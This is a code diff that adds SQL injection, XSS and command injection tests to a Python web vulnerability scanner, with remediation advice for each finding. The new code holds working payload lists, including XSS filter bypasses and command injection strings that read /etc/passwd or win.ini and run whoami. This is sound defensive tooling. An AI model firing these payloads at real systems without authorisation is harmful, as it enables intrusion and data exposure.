@@ -1,13 +1,19 @@
 #!/usr/bin/env python3
 """
 HowBadIsIt? - Professional Web Application Security Scanner
-Version: 2.1.0
+Version: 2.2.0
 Author: Security Research Team
 License: MIT
 
 A comprehensive web security scanner designed for penetration testers,
 red teams, and MSSPs. Performs automated security assessments and
 generates professional reports with visual evidence.
+
+NEW in v2.2.0:
+- SQL Injection Detection (CRITICAL)
+- Cross-Site Scripting (XSS) Detection (HIGH)
+- Command Injection Detection (CRITICAL)
+- 13 professional security tests total
 """
 
 import argparse
@@ -58,7 +64,7 @@ class HowBadIsIt:
             'target': self.target,
             'domain': self.domain,
             'scan_date': datetime.now().isoformat(),
-            'scanner_version': '2.1.0',
+            'scanner_version': '2.2.0',
             'scanner_name': 'HowBadIsIt?'
         }
         
@@ -124,6 +130,9 @@ class HowBadIsIt:
             self.test_cors_misconfiguration,
             self.test_http_methods,
             self.test_waf_detection,
+            self.test_sql_injection,
+            self.test_xss_detection,
+            self.test_command_injection,
         ]
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
@@ -1181,6 +1190,634 @@ class HowBadIsIt:
             'recommendations': recommendations
         }
     
+
+    def test_sql_injection(self) -> Dict[str, Any]:
+        """
+        Test for SQL Injection vulnerabilities.
+        
+        Tests common SQL injection vectors in URL parameters and forms.
+        Detects error-based, boolean-based, and time-based SQLi.
+        """
+        logging.info("Running SQL Injection detection test...")
+        
+        result = {
+            'test_name': 'SQL Injection Detection',
+            'description': 'Tests for SQL injection vulnerabilities in parameters',
+            'status': 'PASS',
+            'severity': 'INFO',
+            'findings': [],
+            'recommendations': []
+        }
+        
+        # SQL injection payloads
+        sqli_payloads = {
+            'error_based': [
+                "'",
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "\" OR \"1\"=\"1",
+                "' UNION SELECT NULL--",
+                "admin'--",
+                "' OR 'a'='a",
+            ],
+            'time_based': [
+                "' AND SLEEP(5)--",
+                "'; WAITFOR DELAY '0:0:5'--",
+                "' AND pg_sleep(5)--",
+            ],
+            'union_based': [
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION ALL SELECT NULL,NULL--",
+            ]
+        }
+        
+        # Database error signatures
+        db_errors = {
+            'MySQL': [
+                'you have an error in your sql syntax',
+                'warning: mysql',
+                'unclosed quotation mark',
+                'quoted string not properly terminated',
+            ],
+            'PostgreSQL': [
+                'postgresql query failed',
+                'pg_query()',
+                'unterminated quoted string',
+            ],
+            'MSSQL': [
+                'microsoft sql server',
+                'odbc sql server driver',
+                'unclosed quotation mark after',
+            ],
+            'Oracle': [
+                'ora-01756',
+                'ora-00933',
+                'oracle error',
+            ],
+            'SQLite': [
+                'sqlite_error',
+                'sqlite3::',
+                'unrecognized token',
+            ]
+        }
+        
+        vulnerabilities_found = []
+        
+        try:
+            # Parse target URL
+            parsed = urlparse(self.target)
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            
+            # Test only if there are query parameters or forms
+            has_params = bool(parsed.query)
+            
+            if has_params:
+                # Extract parameters
+                params = {}
+                for param in parsed.query.split('&'):
+                    if '=' in param:
+                        key, value = param.split('=', 1)
+                        params[key] = value
+                
+                # Test each parameter with SQLi payloads
+                for param_name in params.keys():
+                    for payload_type, payloads in sqli_payloads.items():
+                        for payload in payloads:
+                            # Create test URL
+                            test_params = params.copy()
+                            test_params[param_name] = payload
+                            
+                            # Build query string
+                            query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
+                            test_url = f"{base_url}?{query_string}"
+                            
+                            # Make request
+                            response = self._make_request(test_url)
+                            
+                            if response:
+                                # Check for database errors
+                                response_text = response.text.lower()
+                                
+                                for db_name, error_patterns in db_errors.items():
+                                    for pattern in error_patterns:
+                                        if pattern in response_text:
+                                            vuln = {
+                                                'parameter': param_name,
+                                                'payload': payload,
+                                                'payload_type': payload_type,
+                                                'database': db_name,
+                                                'evidence': pattern
+                                            }
+                                            
+                                            if vuln not in vulnerabilities_found:
+                                                vulnerabilities_found.append(vuln)
+                                                result['findings'].append(
+                                                    f"⚠️ SQL Injection detected in parameter '{param_name}' "
+                                                    f"[{db_name}] - Payload: {payload[:30]}..."
+                                                )
+                
+                # Also test for blind SQLi (time-based)
+                original_response = self._make_request(base_url, params=params)
+                if original_response:
+                    original_time = original_response.elapsed.total_seconds()
+                    
+                    for param_name in params.keys():
+                        test_params = params.copy()
+                        test_params[param_name] = "' AND SLEEP(5)--"
+                        
+                        import time
+                        start = time.time()
+                        response = self._make_request(base_url, params=test_params)
+                        elapsed = time.time() - start
+                        
+                        # If response took significantly longer (>4 seconds), likely vulnerable
+                        if elapsed > 4 and elapsed > original_time + 3:
+                            vulnerabilities_found.append({
+                                'parameter': param_name,
+                                'payload': "' AND SLEEP(5)--",
+                                'payload_type': 'time_based',
+                                'database': 'MySQL (time-based)',
+                                'evidence': f'Response time: {elapsed:.2f}s (expected: ~5s)'
+                            })
+                            result['findings'].append(
+                                f"⚠️ Blind SQL Injection (time-based) detected in parameter '{param_name}' "
+                                f"- Response delayed by {elapsed:.2f}s"
+                            )
+            
+            else:
+                result['findings'].append("No query parameters found to test for SQL injection")
+            
+            # Analyze results
+            if vulnerabilities_found:
+                result['status'] = 'VULNERABLE'
+                result['severity'] = 'CRITICAL'
+                result['vulnerable_parameters'] = vulnerabilities_found
+                
+                # Add specific recommendations
+                unique_params = list(set([v['parameter'] for v in vulnerabilities_found]))
+                unique_dbs = list(set([v['database'] for v in vulnerabilities_found]))
+                
+                result['recommendations'].append(
+                    f"CRITICAL: SQL Injection found in {len(unique_params)} parameter(s): {', '.join(unique_params)}"
+                )
+                result['recommendations'].append(
+                    f"Database type detected: {', '.join(unique_dbs)}"
+                )
+                result['recommendations'].append(
+                    "Use parameterized queries (prepared statements) for all database operations"
+                )
+                result['recommendations'].append(
+                    "Implement input validation and sanitization on server-side"
+                )
+                result['recommendations'].append(
+                    "Use ORM frameworks that handle SQL escaping automatically"
+                )
+                result['recommendations'].append(
+                    "Apply principle of least privilege to database user accounts"
+                )
+                result['recommendations'].append(
+                    "Enable Web Application Firewall (WAF) with SQLi protection rules"
+                )
+                
+            else:
+                if has_params:
+                    result['findings'].append("No SQL injection vulnerabilities detected in tested parameters")
+                result['recommendations'].append(
+                    "Continue using parameterized queries and input validation"
+                )
+        
+        except Exception as e:
+            logging.error(f"SQL Injection test failed: {str(e)}")
+            result['status'] = 'ERROR'
+            result['severity'] = 'INFO'
+            result['error'] = str(e)
+        
+        return result
+    def test_xss_detection(self) -> Dict[str, Any]:
+        """
+        Test for Cross-Site Scripting (XSS) vulnerabilities.
+        
+        Tests for reflected XSS in URL parameters and form inputs.
+        Detects common XSS vectors and filter bypasses.
+        """
+        logging.info("Running XSS detection test...")
+        
+        result = {
+            'test_name': 'Cross-Site Scripting (XSS) Detection',
+            'description': 'Tests for XSS vulnerabilities in parameters and forms',
+            'status': 'PASS',
+            'severity': 'INFO',
+            'findings': [],
+            'recommendations': []
+        }
+        
+        # XSS payloads (ordered from basic to advanced)
+        xss_payloads = [
+            # Basic script tags
+            "<script>alert('XSS')</script>",
+            "<script>alert(1)</script>",
+            "<script>confirm('XSS')</script>",
+            
+            # Image tags
+            "<img src=x onerror=alert('XSS')>",
+            "<img src=x onerror=alert(1)>",
+            
+            # SVG
+            "<svg onload=alert('XSS')>",
+            "<svg/onload=alert(1)>",
+            
+            # Event handlers
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            
+            # IFrame
+            "<iframe src='javascript:alert(1)'>",
+            
+            # Encoded variants
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            
+            # Filter bypasses
+            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+            "<img src=x oneonerrorrror=alert('XSS')>",
+            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+            
+            # Polyglot
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
+        ]
+        
+        vulnerabilities_found = []
+        
+        try:
+            parsed = urlparse(self.target)
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            has_params = bool(parsed.query)
+            
+            if has_params:
+                # Extract parameters
+                params = {}
+                for param in parsed.query.split('&'):
+                    if '=' in param:
+                        key, value = param.split('=', 1)
+                        params[key] = value
+                
+                # Test each parameter with XSS payloads
+                for param_name in params.keys():
+                    for payload in xss_payloads:
+                        # Create test URL
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        # Build query string
+                        query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
+                        test_url = f"{base_url}?{query_string}"
+                        
+                        # Make request
+                        response = self._make_request(test_url)
+                        
+                        if response:
+                            response_text = response.text
+                            
+                            # Check if payload is reflected in response
+                            # Look for unescaped payload
+                            if payload in response_text:
+                                vuln = {
+                                    'parameter': param_name,
+                                    'payload': payload,
+                                    'type': 'reflected',
+                                    'context': 'unescaped'
+                                }
+                                
+                                if vuln not in vulnerabilities_found:
+                                    vulnerabilities_found.append(vuln)
+                                    result['findings'].append(
+                                        f"⚠️ XSS vulnerability detected in parameter '{param_name}' "
+                                        f"- Payload reflected without escaping: {payload[:40]}..."
+                                    )
+                                    break  # Found vulnerability, no need to test more payloads
+                            
+                            # Check for partially escaped but still dangerous
+                            elif any(dangerous in response_text for dangerous in [
+                                'onerror=', 'onload=', 'onfocus=', 'javascript:', 'alert(', 'confirm('
+                            ]):
+                                # Payload may be partially reflected or transformed
+                                vuln = {
+                                    'parameter': param_name,
+                                    'payload': payload,
+                                    'type': 'reflected',
+                                    'context': 'partial_escape'
+                                }
+                                
+                                if vuln not in vulnerabilities_found:
+                                    vulnerabilities_found.append(vuln)
+                                    result['findings'].append(
+                                        f"⚠️ Potential XSS in parameter '{param_name}' "
+                                        f"- Dangerous patterns found in response (partial escaping)"
+                                    )
+                                    break
+            
+            # Also check for DOM-based XSS indicators
+            response = self._make_request(self.target)
+            if response:
+                response_text = response.text.lower()
+                
+                # Check for dangerous JavaScript patterns
+                dom_xss_patterns = [
+                    'document.write(',
+                    'document.writeln(',
+                    'innerhtml =',
+                    'outerhtml =',
+                    'eval(',
+                    'settimeout(',
+                    'setinterval(',
+                    'location.hash',
+                    'location.search',
+                    'document.url',
+                    'document.referrer',
+                ]
+                
+                found_patterns = []
+                for pattern in dom_xss_patterns:
+                    if pattern in response_text:
+                        found_patterns.append(pattern)
+                
+                if found_patterns:
+                    result['findings'].append(
+                        f"⚠️ Potential DOM-based XSS risk - Dangerous JavaScript patterns found: "
+                        f"{', '.join(found_patterns[:3])}{'...' if len(found_patterns) > 3 else ''}"
+                    )
+                    vulnerabilities_found.append({
+                        'type': 'dom_based',
+                        'patterns': found_patterns
+                    })
+            
+            else:
+                result['findings'].append("No query parameters found to test for reflected XSS")
+            
+            # Analyze results
+            if vulnerabilities_found:
+                result['status'] = 'VULNERABLE'
+                result['severity'] = 'HIGH'
+                result['vulnerable_parameters'] = vulnerabilities_found
+                
+                # Count types of XSS found
+                reflected_count = sum(1 for v in vulnerabilities_found if v.get('type') == 'reflected')
+                dom_count = sum(1 for v in vulnerabilities_found if v.get('type') == 'dom_based')
+                
+                if reflected_count > 0:
+                    unique_params = list(set([v['parameter'] for v in vulnerabilities_found if 'parameter' in v]))
+                    result['recommendations'].append(
+                        f"CRITICAL: Reflected XSS found in {len(unique_params)} parameter(s): {', '.join(unique_params)}"
+                    )
+                
+                result['recommendations'].append(
+                    "Implement proper output encoding/escaping for all user input"
+                )
+                result['recommendations'].append(
+                    "Use Content-Security-Policy (CSP) header to mitigate XSS impact"
+                )
+                result['recommendations'].append(
+                    "Validate and sanitize all input on server-side"
+                )
+                result['recommendations'].append(
+                    "Use framework-provided XSS protection (e.g., templating engines with auto-escaping)"
+                )
+                
+                if dom_count > 0:
+                    result['recommendations'].append(
+                        "Avoid using dangerous JavaScript functions with user input (eval, innerHTML, etc.)"
+                    )
+                    result['recommendations'].append(
+                        "Use safe DOM manipulation methods (textContent, setAttribute, etc.)"
+                    )
+                
+                result['recommendations'].append(
+                    "Enable HttpOnly flag on cookies to prevent XSS-based cookie theft"
+                )
+                
+            else:
+                if has_params:
+                    result['findings'].append("No XSS vulnerabilities detected in tested parameters")
+                result['recommendations'].append(
+                    "Continue implementing proper output encoding and CSP headers"
+                )
+        
+        except Exception as e:
+            logging.error(f"XSS detection test failed: {str(e)}")
+            result['status'] = 'ERROR'
+            result['severity'] = 'INFO'
+            result['error'] = str(e)
+        
+        return result
+    def test_command_injection(self) -> Dict[str, Any]:
+        """
+        Test for Command Injection vulnerabilities.
+        
+        Tests for OS command injection in URL parameters.
+        Detects command execution through various injection techniques.
+        """
+        logging.info("Running Command Injection detection test...")
+        
+        result = {
+            'test_name': 'Command Injection Detection',
+            'description': 'Tests for OS command injection vulnerabilities',
+            'status': 'PASS',
+            'severity': 'INFO',
+            'findings': [],
+            'recommendations': []
+        }
+        
+        # Command injection payloads
+        cmd_payloads = {
+            'unix': [
+                "; ls -la",
+                "| whoami",
+                "`id`",
+                "$(cat /etc/passwd)",
+                "; uname -a",
+                "| cat /etc/issue",
+                "&& pwd",
+                "; echo 'CMD_INJECTION_TEST'",
+            ],
+            'windows': [
+                "& dir",
+                "| whoami",
+                "&& echo CMD_INJECTION_TEST",
+                "; ver",
+                "| type C:\\Windows\\win.ini",
+            ],
+            'blind': [
+                "; sleep 5",
+                "| ping -c 5 127.0.0.1",
+                "& timeout 5",
+                "; sleep 5 #",
+                "| sleep 5 ||",
+            ]
+        }
+        
+        # Command output indicators
+        command_indicators = {
+            'unix': [
+                'root:',  # /etc/passwd
+                'uid=',   # id command
+                'total ',  # ls -la
+                'linux',   # uname
+                'ubuntu',
+                'debian',
+                'centos',
+                '/bin/',
+                '/usr/',
+            ],
+            'windows': [
+                'volume serial number',
+                'directory of',
+                'windows',
+                'c:\\',
+                'cmd.exe',
+                'system32',
+            ],
+            'generic': [
+                'CMD_INJECTION_TEST',
+                'command not found',
+                'syntax error',
+                'unexpected token',
+            ]
+        }
+        
+        vulnerabilities_found = []
+        
+        try:
+            parsed = urlparse(self.target)
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            has_params = bool(parsed.query)
+            
+            if has_params:
+                # Extract parameters
+                params = {}
+                for param in parsed.query.split('&'):
+                    if '=' in param:
+                        key, value = param.split('=', 1)
+                        params[key] = value
+                
+                # Get baseline response time
+                baseline_response = self._make_request(base_url, params=params)
+                baseline_time = baseline_response.elapsed.total_seconds() if baseline_response else 0
+                
+                # Test each parameter
+                for param_name in params.keys():
+                    # Test Unix/Linux commands
+                    for payload_type, payloads in cmd_payloads.items():
+                        for payload in payloads:
+                            test_params = params.copy()
+                            test_params[param_name] = payload
+                            
+                            query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
+                            test_url = f"{base_url}?{query_string}"
+                            
+                            # For time-based detection
+                            if payload_type == 'blind':
+                                import time
+                                start = time.time()
+                                response = self._make_request(test_url)
+                                elapsed = time.time() - start
+                                
+                                # If response took significantly longer, likely vulnerable
+                                if elapsed > 4 and elapsed > baseline_time + 3:
+                                    vuln = {
+                                        'parameter': param_name,
+                                        'payload': payload,
+                                        'type': 'time_based',
+                                        'evidence': f'Response delayed by {elapsed:.2f}s'
+                                    }
+                                    
+                                    if vuln not in vulnerabilities_found:
+                                        vulnerabilities_found.append(vuln)
+                                        result['findings'].append(
+                                            f"⚠️ Command Injection (time-based) detected in '{param_name}' "
+                                            f"- Payload: {payload} - Delay: {elapsed:.2f}s"
+                                        )
+                            else:
+                                # For output-based detection
+                                response = self._make_request(test_url)
+                                
+                                if response:
+                                    response_text = response.text.lower()
+                                    
+                                    # Check for command output indicators
+                                    for os_type, indicators in command_indicators.items():
+                                        for indicator in indicators:
+                                            if indicator.lower() in response_text:
+                                                vuln = {
+                                                    'parameter': param_name,
+                                                    'payload': payload,
+                                                    'type': 'output_based',
+                                                    'os': os_type,
+                                                    'evidence': indicator
+                                                }
+                                                
+                                                if vuln not in vulnerabilities_found:
+                                                    vulnerabilities_found.append(vuln)
+                                                    result['findings'].append(
+                                                        f"⚠️ Command Injection detected in '{param_name}' "
+                                                        f"[{os_type}] - Evidence: '{indicator}'"
+                                                    )
+                                                    break
+            else:
+                result['findings'].append("No query parameters found to test for command injection")
+            
+            # Analyze results
+            if vulnerabilities_found:
+                result['status'] = 'VULNERABLE'
+                result['severity'] = 'CRITICAL'
+                result['vulnerable_parameters'] = vulnerabilities_found
+                
+                unique_params = list(set([v['parameter'] for v in vulnerabilities_found]))
+                detected_os = list(set([v.get('os', 'unknown') for v in vulnerabilities_found if 'os' in v]))
+                
+                result['recommendations'].append(
+                    f"CRITICAL: Command Injection found in {len(unique_params)} parameter(s): {', '.join(unique_params)}"
+                )
+                
+                if detected_os:
+                    result['recommendations'].append(
+                        f"Operating system detected: {', '.join(detected_os)}"
+                    )
+                
+                result['recommendations'].append(
+                    "NEVER execute system commands with user-supplied input"
+                )
+                result['recommendations'].append(
+                    "Use language-specific APIs instead of shell commands when possible"
+                )
+                result['recommendations'].append(
+                    "If system calls are necessary, use parameterized/safe execution methods"
+                )
+                result['recommendations'].append(
+                    "Implement strict input validation with allowlists (not blocklists)"
+                )
+                result['recommendations'].append(
+                    "Run application with least privilege - avoid root/administrator accounts"
+                )
+                result['recommendations'].append(
+                    "Use containerization/sandboxing to limit command injection impact"
+                )
+                result['recommendations'].append(
+                    "Enable WAF rules to detect and block command injection attempts"
+                )
+                
+            else:
+                if has_params:
+                    result['findings'].append("No command injection vulnerabilities detected in tested parameters")
+                result['recommendations'].append(
+                    "Continue avoiding system command execution with user input"
+                )
+        
+        except Exception as e:
+            logging.error(f"Command Injection test failed: {str(e)}")
+            result['status'] = 'ERROR'
+            result['severity'] = 'INFO'
+            result['error'] = str(e)
+        
+        return result
     def _generate_report(self) -> Dict[str, Any]:
         """Generate final scan report."""
         logging.info("Generating final report...")
@@ -1223,8 +1860,10 @@ def main():
     banner = """
 ╔═══════════════════════════════════════════════════════════════════╗
 ║                                                                   ║
-║                     HowBadIsIt? v2.1.0                            ║
+║                     HowBadIsIt? v2.2.0                            ║
 ║            Professional Web Security Scanner                      ║
+║                                                                   ║
+║            NEW: SQL Injection + XSS + Command Injection           ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝
     """
